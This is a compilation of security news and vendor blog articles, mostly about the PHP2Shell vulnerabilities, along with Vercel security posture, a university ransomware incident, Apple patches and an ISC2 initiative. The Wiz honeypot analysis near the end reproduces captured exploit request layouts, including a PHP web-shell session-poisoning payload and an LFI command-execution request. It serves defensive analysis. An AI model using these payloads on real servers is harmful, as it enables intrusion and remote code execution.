Falco sees syscalls, not HTTP requests. It cannot see the malicious request itself, but it can see what the request causes on the host. There are many possible detection strategies, such as detecting shell processes from php workers, but noise often poses a major challenge. As we showed before with Sysdig Secure, many existing post-exploitation detection strategies apply.

Recommendations

Update PHP on every server: Move to 8.5.12, 8.4.27, 8.3.36, or 8.2.35, or to a vendor-patched package. This is the only complete fix. Application code cannot fix this.

Restart every PHP worker after you patch: Old workers keep running the vulnerable code.

Mitigate with the interim settings if you cannot patch today: PHP states that these settings reduce the risk but do not remove it:

Set memory_limit=-1 through php_admin_value, so applications cannot override it. Enforce request size limits at the web server or proxy instead. Do not use RLIMIT_AS or RLIMIT_DATA.

Set session.upload_progress.enabled=0 in php.ini or the FPM pool config. Do not rely on ini_set() or .user.ini.

On PHP 8.5, also set fatal_error_backtraces=0.

Restart every worker, and verify the values through a web request, not the CLI.‍

Block multipart/form-data at the edge if uploads are not needed: This blocks the session upload-progress path and the memory disclosure. It does not cover every bug, and it breaks file uploads and some checkout forms.

‍Audit your environment: Find every affected host and workload, and start with internet-facing ones. Sysdig Secure customers can use the Threat Intelligence entry and Vulnerability Management findings. ‍

Investigate dating back to October 17: Exploitation began before disclosure. Check for web shells, new cron jobs, new accounts, and shells spawned by web server processes.‍

Rotate secrets: Because of the memory disclosure, even if you see no sign of code execution, secrets should be rotated for exposed servers.‍

Enable default runtime policies: Use detections for post-exploitation behavior such as known threats, threat intelligence matches, and behavioral anomalies. For internet-facing web applications, alert on shells and suspicious commands spawned by the web server. The Sysdig Runtime Threat Detection, Sysdig Runtime Threat Intelligence, and Sysdig Runtime Behavioral Analytics policies catch the post-exploitation stage. For internet-facing PHP, customers should also enable the Sysdig Runtime Notable Events policy, or at least its rules for shells and suspicious commands spawned by web servers.

Conclusion

PHP2Shell is composed of four memory-safety bugs under two critical CVEs in PHP core, the most widely deployed web runtime. Exploitation began before the fix existed, and PHP has carried the vulnerable code since 2012.

It is the third high-impact flaw this year in old, widely trusted core code, following Copy Fail and Dirty Frag. Like those vulnerabilities, PHP2Shell was found with AI assistance. Defenders should approach these vulnerabilities with an “assume breach” mindset, as exploitation can begin before a patch exists. Patch first. Then, until every worker is patched and restarted, use the interim settings, edge filtering, and runtime detection to close the gap.

Title: Securing Vercel at Scale: From One Team to Every Team
Context: Researchers at Red Access found about 5,000 corporate apps among 380,000 public assets on AI app platforms, and about 40% of those exposed sensitive data (TechTarget)
Full Text:
On Thursday, a customer marketing manager vibe codes a community portal where customers can sign in, post questions, and search past answers. By Friday it’s live on Vercel, with a custom domain, an OPENAI_API_KEY for the AI search saved as a plain config variable, and a database full of customer names, emails, and support threads.

No ticket. No code review. No security sign-off. Nothing broke, so nobody looked.

Vercel has the settings to prevent every part of that. The harder question belongs to the security team: how do you know those settings are on, for every team, across the whole company?

The builder population just changed

Vercel used to be where front-end engineers shipped Next.js apps. Now it’s where AI ships apps for everyone else. Vercel’s v0 has crossed 4 million users (SaaStr), and CEO Guillermo Rauch says more than 60% of activity on Vercel is now driven by coding agents (The Stack).

Many of those apps belong to companies, not hobbyists. Researchers at Red Access found about 5,000 corporate apps among 380,000 public assets on AI app platforms, and about 40% of those exposed sensitive data (TechTarget).

Why your current tools only see part of it

Vercel isn’t a cloud account, a repo, or a typical SaaS app. It’s a control plane that sits between all three, so each tool you already own sees only part of it:

CNAPP sees the AWS, Azure, or GCP accounts DevOps provisioned. Vercel isn’t one of them.

AppSec scans the repos you point it at. An app built from a prompt may never pass through one.

SSPM checks SaaS sign-in and access settings, but rarely Vercel’s deployment and firewall settings.

Vercel’s own Security Dashboard, free on every plan since August 2026, is the best place to start. It scores a team on settings like MFA, owner count, token expiry, and secret storage (Vercel). But it covers one team at a time, a fixed list of checks, and only Vercel.

These settings are configured in Vercel, team by team, usually by whoever created the team: access tokens, environment variables, custom domains, deployment protection, SAML enforcement, firewall rules. That person usually isn’t on the security team.

Vercel’s dashboard tells one team how its settings look. Security teams need every team, more checks, and one place to work them next to the rest of their risk.

What Orca adds beyond Vercel’s dashboard

The integration supports Vercel Enterprise. You connect it with a Full Account access token created by a dedicated service user with the Enterprise Viewer and Security roles, so Orca’s access stays read-only. Set an expiration on the token and rotate it (Vercel access tokens). If your organization enforces SAML, connect each team with its own team token instead. There’s no agent to install, nothing to deploy in Vercel, and no change to how anyone builds.

Orca inventories every team the token can reach, including teams added later: projects, deployments, domains, members, access tokens, firewall settings, and environment-variable metadata, never the values. Each Vercel team shows up as an account in Orca, so you see every team in one place instead of one dashboard per team.

Orca runs a variety of detections out of the box. Some overlap with Vercel’s dashboard.

Four misconfigurations that AI-built apps make by default

These four issues come up most with AI-built apps. None is a mistake anyone makes on purpose. Each is a default, or a step builders skip because nothing breaks without it.

Production URLs with no login. Vercel’s Deployment Protection covers preview URLs by default. Production is a separate setting. Builders rarely change it, because the app works fine either way. The result is a public, indexable production URL with nothing in front of it. The fix is free: since September 2026, every plan can put Vercel Authentication in front of production and make it the team default (Vercel).

Secrets saved as readable Config variables. Since August 2026, Vercel stores each variable as Config (readable) or Secret (write-only) (Vercel). Values are encrypted at rest, but a STRIPE_SECRET_KEY saved as Config stays readable to anyone with project access. The name is the giveaway, and that’s what Orca flags.

SAML connected but not enforced. The identity team links the IdP to Vercel. Nobody turns on enforcement, so members can still reach the team without a SAML session (Vercel).

Long-lived and forgotten access tokens. A Full Account or Team token carries the role of the person who created it. Tokens set to never expire, or unused for 90 days, are standing credentials nobody is watching. Orca flags both. Project-scoped tokens limit any one token to a single project (Vercel).

One queue for every team

A dashboard per Vercel team works for the person who owns that team. It doesn’t work for a security team responsible for dozens of them.

In Orca, Vercel findings show up alongside your AWS, Azure, and GCP findings, in the same risk scoring, alert workflows, and ticketing integrations your team already uses. Each finding shows which Vercel team owns the project, so it reaches someone who can fix it. New teams are covered as soon as they’re created, without anyone registering them.

Vercel findings land prioritized in the same queue as your cloud findings in the Orca Platform

Vercel is one part of the AI-built app

An AI-built app has five parts: the model behind it, the agent or builder that made it, the platform it runs on, the database and login behind it, and the cloud account under it. Each comes from a different vendor and has a different owner. None of those owners is security.

Orca AI AppGen Security covers these parts in one platform instead of one tool per vendor. Today that means Vercel, where AI-built apps run, and Claude Enterprise, where many of them start, in the same inventory and the same queue. More platforms are coming.

The goal isn’t to slow builders down. They keep the tools they picked. Security gets enough visibility to say yes instead of no.

As cloud, applications, AI and app generation expand the attack surface, Orca transforms security risk into the context teams need to act. The Orca Platform provides complete visibility across cloud, AI, and application environments, correlates risk across every layer, and prioritizes the exposures that matter most so organizations can remediate faster and innovate with confidence. Full Text:
The University of New Mexico Health Sciences Center (UNM HSC) has been hit by a cyber incident, which resulted in the cancellation of surgeries and diversion of ambulances.

The medical center disclosed the incident on Monday October 26 at 2.30pm MDT, informing patients that all appointments, including scheduled surgeries, were cancelled for the rest of the day.

“UNM Health patients should not show up to UNM Health facilities on October 26. Emergencies should be handled by 911 and non-emergencies should be delayed until further notice,” the update read.

Clinical Services Resume but Classes Cancelled

A further update posted at 10.27pm on October 26 confirmed that all UNM Health hospitals had reopened, and clinics would resume regularly scheduled appointments and procedures from Tuesday, October 27.

“At 2:30pm, UNM Health began resuming operations and bringing systems back online in phases, as it was safe to do so. We will work with patients to reschedule missed appointments and procedures,” HSC added.

Read now: UK Healthcare Sector Records Tenfold Increase in Cyber-Attacks

All students enrolled at the School of Medicine, College of Pharmacy, College of Nursing, and College of Population Health were told to leave campus on Monday.

As part of its remediation efforts, UNM canceled classes on the Health Sciences campus and sent non-essential employees home.

All classes at the UNM School of Medicine, College of Nursing, College of Pharmacy and College of Population Health were also canceled on Tuesday, October 27, including online and remote classes, while non-essential employees will remain at home.

However, classes at UNM’s Central and branch campuses are not affected.

BYOD Ransomware Claims Attack

No details on the nature of the incident, or potential perpetrators, have been provided at the time of writing.

However, the emerging ransomware group BYOD has reportedly claimed to be behind the incident affecting UNM HSC.

Cybersecurity intelligence firm VenariX revealed on X that the group listed the University of New Mexico on its data leak site, claiming to have compromised 36,000 machines and exfiltrated sensitive data.

This data allegedly includes student and employee personally identifiable information (PII), research data, student records and internal emails.

“This is your entire network and infrastructure compromised, the entire university COMPLETELY,” the group posted on its data leak site.

UNM HSC receives more than one million patient visits every year, made up of around 900,000 outpatient appointments and around 100,000 emergency room visits.

The Center had 2670 students enrolled in its classes in 2025.

Title: ISC2 Launches Cyber-AI Workforce Coalition to Address the Future of AI Security Jobs
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
After years of tracking the global cybersecurity skills gap through its annual Cybersecurity Workforce Study, ISC2 is taking a more active role in shaping the future of the profession with the launch of its Cyber-AI Workforce Coalition.

Announced on October 20, the new coalition is one of the first major developments introduced by Scott Beale, ISC2’s CEO, who took on the role in December 2025.

Speaking to Infosecurity during the ISC2 Security Congress 2026, in Denver, Colorado, on October 26, Beale said he spent his first six months as CEO listening to the organization’s members.

A key finding from the consultation was that a majority of ISC2 members want the nonprofit to more ambitiously and vocally step into the AI safety and security space.

“We want to be the association that can help prepare the cybersecurity workforce for the many challenges of this AI era,” Beale added.

Mapping the AI Security Workforce and Its Emerging Skills Gap

Beale described the coalition as a “vendor-neutral convener” for global cybersecurity professionals. It aims to include thought leaders like HR managers and CISOs, some of the largest employers of cybersecurity practitioners, standard-setting bodies and even government representatives to discuss how cybersecurity roles are changing because of AI.

“Even as the US National Institute of Standards and Technology (NIST) and others are updating standards and frameworks, companies are still facing a lack of resources for how to best advertise and fill these roles. How a bank describes these jobs is still very different from how a hospital would,” Beale said.

Hiring needs at the intersection of AI and cybersecurity remain uncertain, according to Beale. There remain unanswered questions about how AI will affect future demand for cybersecurity professionals, which skills will be most critical for AI security roles, and how experienced practitioners can upskill to meet emerging demands.

“The coalition a way for us to listen directly to these people and help move the sector in a way that can be responsive to their needs,” he said.

Practical Tools to Define and Hire for AI Security Roles

In practice, the coalition will not create new standards or frameworks but will instead focus on delivering toolkits for employers to help them describe new job roles at the intersection of AI and cybersecurity.

These toolkits will include guidance for how employers hire, develop and organize cybersecurity talent, and how practitioners can identify and build the expertise employers need.

These new tools will help answer three main questions:

How are cybersecurity jobs changing?

How are employers writing job descriptions for these new roles?

How are candidates preparing to interview and fill these jobs?

“As you know, ISC2 is working on a new AI security certification, and certainly we think It is going to be part of that answer and will help us define some of these new roles,” he said. “However, by no means do we pretend having the only solution to this problem.”

The coalition will hold its first meeting in November. Beale hopes it can develop its first series of toolkits by the spring of 2027 and have some companies using them in a pilot phase to help them hire AI security professionals.

The tools produced by the coalition are expected to eventually be made available for everyone to use, not just ISC2 members. Beale believes they will also be useful for universities and certification bodies to adapt their curriculums.

Title: CISA confirms PHP2Shell under attack as researchers clock successful exploits
Context: The US government's cybersecurity watchdog has confirmed attackers are exploiting both critical PHP2Shell vulnerabilities, giving federal agencies three days to patch the bugs...
Full Text: The US government's cybersecurity watchdog has confirmed attackers are exploiting both critical PHP2Shell vulnerabilities, giving federal agencies three days to patch the bugs that have wreaked havoc across the web over the past week. CISA added CVE-2026-109618 and CVE-2026-109619 to its Known Exploited Vulnerabilities (KEV) catalog on Monday, setting an October 29 deadline for federal civilian agencies to address the flaws. The move marks a shift from last week, when the agency warned of the danger posed by PHP2Shell but said it had not yet observed successful exploitation in the wild. Both bugs are rated 9.2 on the CVSS scale and can be exploited without authentication to run code on vulnerable PHP servers. That's bad news given how much of the web still relies on PHP, and just how many sites could be left exposed. Patches landed on October 21, but attackers had already beaten the maintainers to it. AWS spotted attempts to exploit the flaws as early as October 17, four days before the bugs were publicly disclosed. CISA's confirmation comes amid growing evidence that attackers are doing more than simply knocking on the door. On October 24, Perplexity security researcher Adel Karimi recorded 35 successful shell executions across three honeypots running PHP 8.4.26 under Apache mod_php. The attacks came from two IP addresses and used memory exhaustion and disclosure to achieve remote code execution. The attackers then tried to contact external servers using PHP, curl, and wget, although no additional malware was successfully downloaded. Karimi's findings were consistent with exploitation of CVE-2026-109618, but he found no evidence that the second PHP2Shell flaw was involved. He also warned that the honeypots used a favorable single-worker configuration, so the results don't necessarily reflect how reliably the exploit works against production servers. Still, attackers appear to be giving it a good go. Delft University's Threat Intelligence Lab has tracked more than 50,000 PHP2Shell exploitation requests from over 600 IP addresses across 70 countries. Of those, 171 addresses went beyond probing for vulnerable servers and started sending exploit code or malware droppers. CISA's confirmation also comes after some of the earlier reports of successful PHP2Shell attacks turned out to be rather premature. Sophos walked back its initial assessment after determining that the activity it observed amounted to scanning and failed attempts, while Palo Alto Networks withdrew claims linking the vulnerabilities to an intrusion at a European government agency. CISA has not disclosed which organizations have been compromised or provided details of the attacks behind its decision to add the flaws to KEV. The listing confirms that the agency considers both vulnerabilities actively exploited, but it does not confirm how many production systems have been successfully breached. For federal agencies, the clock is now ticking. CISA is also urging organizations outside the federal government to prioritize the fixes, although the deadline does not apply to them. Admins should update to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35, depending on their release branch. Those running older, unsupported versions face the added headache of upgrading or obtaining vendor-supported fixes, while systems that cannot be secured should be taken offline until the risk is addressed. And with CISA now officially acknowledging exploitation, anyone still waiting for more proof before patching may be waiting a little too long. ®

Title: Apple Backports Fix for Exploited CoreGraphics Flaw to Older iPhones and iPads
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
Apple on Monday backported fixes for a high-severity security flaw that was exploited in real-world cyber attacks to older devices.

The vulnerability, tracked as CVE-2026-86950 (CVSS score: 8.8), is an out-of-bounds write affecting CoreGraphics that could result in arbitrary code execution when processing a maliciously crafted file.

Patches for the flaw were released last month by Apple in versions iOS 26.7.1, iPadOS 26.7.1, macOS Tahoe 26.7.1, and macOS Sequoia 15.8.1, acknowledging that it may have been exploited in sophisticated attacks against specific individuals using devices running iOS before iOS 27.

The fixes have now been expanded to include iOS 18.7.11 and iPadOS 18.7.11, which support iPhone XS, iPhone XS Max, iPhone XR, iPad 7th generation, iPad Air 4th generation and later, iPad 9th generation and later, and iPad mini 6th generation and later.

"Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 27," the company said.

iOS 18.7.11 and iPadOS 18.7.11 also address a logic issue in Audio (CVE-2026-65339) that could be exploited by an app to leak sensitive user information and an access vulnerability in CoreMedia (CVE-2026-86990) that could be abused by a malicious app to access the camera without user permission.

The release comes as Apple shipped iOS 27.2, iPadOS 27.2, macOS Golden Gate 27.2, tvOS 27.2, watchOS 27.2, visionOS 27.2, and Safari 27.2, fixing hundreds of vulnerabilities, including many in AppleAVD, CoreAudio, ImageIO, kernel, Model I/O, Screen Sharing Server, Spotlight, StorageKit, and WebKit.

Notable among the defects is an authorization issue in Apple Intelligence (CVE-2026-86987) that could be exploited by a remote attacker to access sensitive user data. The iPhone maker said the issue was addressed in iOS and iPadOS with improved entitlement checks.

Although Apple makes no mention of any of these flaws being exploited in the wild, it's always a good practice to update the devices to the latest version for optimal protection.

Title: PHP2Shell: Exploitation Attempts and Remediation Trends
Context: When only one worker was available the exploit attempted heap-shaping by sending requests containing 1,001 fields of 3,000 bytes each
Full Text:
Last week, we published a report describing two major vulnerabilities in PHP (CVE-2026-109618, CVE-2026-109619). Since then, alongside much of the security industry, the Wiz Research team has been monitoring for related activity in the wild and reviewing publicly available exploit code. So far, we have observed a limited number of exploitation attempts in our telemetry and have not identified a publicly available proof of concept (PoC) demonstrating complete, general end-to-end exploitation against an arbitrary target. Some partners have, however, privately disclosed to us exploits that work against a variety of targets and we continue to experiment internally. Videos demonstrating our successful exploitations are available at php2shell.com.

This post summarizes what we have observed in terms of remediation efforts and exploitation attempts across real world environments and in our own honeypot data to date and shares findings from our ongoing investigation into these activities.

We will continue monitoring developments and update this post as new evidence emerges.

Observed exposure trends

Following PHP2Shell’s public disclosure on October 21, 2026, Wiz telemetry has recorded an approximate 67% decrease in the daily number of distinct Internet-exposed machines vulnerable to PHP2Shell over the past few days. Separately, among vulnerable Internet-exposed machines, the proportion running PHP version 7.3 or earlier fell from 8.3% to 5.7% over a period of five days. This measures the share of the observed population running older versions that did not receive official backports.

During this period, the number of significantly affected organizations - defined here as those with at least one exposed and vulnerable instance - fell by approximately 47.9% (see graph below). For reference, our data shows that PHP itself is in use by 65% of organizations in our dataset.

Together, these observations are consistent with organizations collectively reducing their exposure through a combination of patching, upgrading, retiring affected machines and restricting internet access (note that this data shows the overall trend, but does not establish the relative contribution of each remediation strategy; scan coverage and size of observed population can also affect the overall reported numbers over time).

Exploitation attempts observed by Wiz research

We have so far observed the following types of activities in this context:

Attempts using the PHP2Shell exploit mechanism, with techniques matching those of public PoCs.

PHP2Shell-branded tools unrelated to the vulnerabilities that instead relied on session poisoning and a separate local file inclusion (LFI) vulnerability in the application.

Attempts using the PHP2Shell exploit mechanism

We observed two variants of an open source exploit kit targeting PHP-based software. Neither completed the exploit chain in the attempts we captured. The older variant encountered request-size limits or failed to produce the expected memory-exhaustion condition. The newer variant did consistently exhaust PHP’s memory, but failed to obtain the memory addresses needed to continue.

Variant 1: the legacy chain

The first request to our PHP-CGI honeypot came from 3.37.227[.]134. It matched the kit’s older chain, found under archive/legacy-8m/exploit.py and its accompanying stage scripts. The first full exploit stage used a multipart body containing 1,005 parts, including a field named big filled with approximately 12 MB of padding:

POST / HTTP/1.1 Host: <honeypot> Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS Content-Length: 12655437 [1,005 parts] 1001 x p0000 = "x" 1 x PHPSESSID = "\x00" 1 x PHP_SESSION_UPLOAD_PROGRESS = "pwn" 1 x f (file) = "A" x 64 1 x big = "B" x ~12 MB

According to the kit’s notes, this stage attempts to exhaust memory during a session reset, leaving the session state available for a later request.

On our honeypot, it failed before reaching that code. The declared request size exceeded the configured 8 MB post_max_size limit, so PHP skipped processing the multipart body and logged:

POST Content-Length of 12655437 bytes exceeds the limit of 8388608 bytes

The author has since moved this chain into the kit’s archive directory.

A later attempt against Roundcube

In a later attempt, 103.151.172[.]95 sent a longer sequence from the legacy chain. It included stalled connections intended to occupy other Apache workers.

When only one worker was available the exploit attempted heap-shaping by sending requests containing 1,001 fields of 3,000 bytes each. These requests didn’t trigger the memory exhaustion flow required. So there is no evidence that this attempt reached the intended memory-exhaustion condition.

Variant 2: the current chain

Most IP addresses we captured used the newer chain, built from pure/mk_a1.py and pure/mk_leak_b.py. We observed this variant in multiple attempts.

This variant progressed further: its first stage consistently caused PHP to exhaust its memory. The following stage, which attempts to leak process memory, failed in every run we captured.

The server logged a fatal error indicating that PHP reached its limit, for example:

Allowed memory size of 134217728 bytes exhausted (tried to allocate 81920 bytes) in Unknown on line 0.

Keeping requests on the same worker

The chain depends on consecutive exploit requests reaching the same Apache child process. To increase the chances of that happening, the kit attempts to occupy the other workers with incomplete requests. Each connection declares a large body, sends a single byte and stalls:

POST /index.php HTTP/1.1 Host: <honeypot> Content-Type: application/x-www-form-urlencoded Content-Length: 1048576 x

One address, 178.249.214[.]6, opened 399 of these connections alongside 400 GET requests before sending the exploit stages. The address is a VPN exit node, which limits what we can infer about the source.

Stage A1: triggering memory exhaustion

A1 is a chunked multipart request containing a null-byte session ID, 860 empty file parts with long, deeply nested array names and several groups of padding fields:

POST /?q0=v&q1=v&q2=v&q3=v&q4=v HTTP/1.1

Host: <honeypot> Content-Type: multipart/form-data; boundary=CCCCCCCCCC Transfer-Encoding: chunked [1,060,211 bytes, 974 parts] 1 x PHPSESSID = "\x00" 860 x files[R00000KKKK...][a][a]... (file, empty) 14 x f0000xxxx... = "vvvvvvvv" 78 x b0000 = "B" x 8000 20 x u00 = "U" x 4000 1 x PHP_SESSION_UPLOAD_PROGRESS = "k" x 4000

The request is designed to exhaust memory during session handling at a point that can leave the session ID pointing to freed memory.

Every A1 request we captured returned HTTP 500, accompanied by a PHP error matching:

Allowed memory size of 67108864 bytes exhausted ... in Unknown on line 0

This confirms that A1 reached the intended memory-exhaustion condition on our honeypot. It does not, by itself, confirm that the stale session state needed by the next stage was preserved.

Stage B1: attempting the memory leak

B1 followed roughly a second later. It sent another chunked multipart request containing PHPSESSID=a, PHP_SESSION_UPLOAD_PROGRESS=k0and two large padding fields.

If this request reaches the same worker before PHP resets the stale session state, PHP can write reclaimed heap contents into a PHPSESSID response cookie. The kit then extracts heap and libphp addresses from that cookie to prepare the final exploit stage.

We observed no such leak. In all but one run, the connection closed without a response. The remaining run returned a normal 32-character session cookie. None of the sources sent the final exploit stage.

Why the leaks may have failed

The failed leaks highlight a broader challenge: building a generalized exploit that works reliably across PHP versions and deployment configurations is difficult. The kit’s B1 layout was calculated for the official php:8.4.26-apache image with a 128 MB memory limit. Other instances like our Roundcube honeypot ran the same PHP version from a different build, with additional extensions and a 64 MB memory limit. These differences can affect heap layout and memory reuse, potentially preventing the leak from working as expected.

Reliable worker pinning adds another challenge. Consecutive exploit requests must reach the same Apache child process while the required session state persists. Request timeouts, network latency and worker availability can disrupt this sequence. In our own testing, request timeouts combined with network latency were enough to prevent the chain from completing over an internet connection.

So far, we have not identified a publicly available, generalized solution for either worker pinning or information leaking across different deployments. Simply copying public PoCs and running them at scale does not address the work needed to turn a configuration-specific exploit into a reliable operational kit. We expect these barriers to diminish over time: some threat actors have the expertise needed to adapt the chain and build more robust tooling.

Other attempts

We also saw failed exploitation attempts from 15.204.59[.]70 and 162.35.99[.]94, but these scanners did successfully exploit Adel Karimi's honeypot, which was a likely contributing factor to CISA’s decision to include PHP2Shell in their KEV list.

PHP2Shell-branded tools unrelated to the vulnerabilities

We also observed tools labeled as PHP2Shell exploits that did not actually attempt to exploit either vulnerability. The earliest such traffic, from 85.11.187[.]35, matched a Go port of “Chain A” from WoYinDao/CVE-2026-109618-CVSS-9.2-Critical.

The tool used a longstanding session-poisoning technique, attempting to write PHP code into a session file through the upload-progress feature. The request below is abbreviated:

POST /index.php HTTP/1.1 Host: <honeypot> User-Agent: Go-http-client/1.1 Content-Type: multipart/form-data; boundary=----php2shell-golang PHP_SESSION_UPLOAD_PROGRESS = <?php echo "PHP2SHELL_XBu4Je"; system($_GET["c"]); ?> PHPSESSID = <attacker-chosen ID> f (file) = "Z"

It then attempted to execute that code by including the session file:

GET /lfi_sink.php?c=id&f=/tmp/sess_SUjKIKy3Rr6QsaJ1Ik7Rme8h3n HTTP/1.1

Crucially, lfi_sink.php is a vulnerable endpoint supplied by the PoC’s lab environment. The tool assumes that this endpoint exists on the target; without it or an equivalent local file inclusion (LFI) vulnerability, the chain cannot execute code.

A padded variant triggered our memory-exhaustion detection, but we observed no successful code execution. Despite the PHP2Shell branding, this activity relied on an unrelated technique and a vulnerable application endpoint.

Conclusion

We have not yet observed successful end-to-end PHP2Shell exploitation in our own telemetry. However, Adel Karimi’s public report and supporting data provide the most robust public evidence we have seen to date, correlating exploit traffic, memory disclosure and subsequent code execution on his honeypots. Notably, those targets used a favorable single-worker Apache mod_php configuration, so the findings do not establish reliability across other deployments.

Our observations show that triggering memory exhaustion alone is not enough to complete the exploit chain. Differences in PHP builds, memory limits and worker behavior can prevent subsequent stages from working. The challenge for opportunistic attackers is turning currently available public PoCs into similarly reliable operational tooling or developing it on their own. In our view, PHP2Shell remains a risk in both the short and long term and applying the PHP security updates or remediating through other means therefore remains essential.
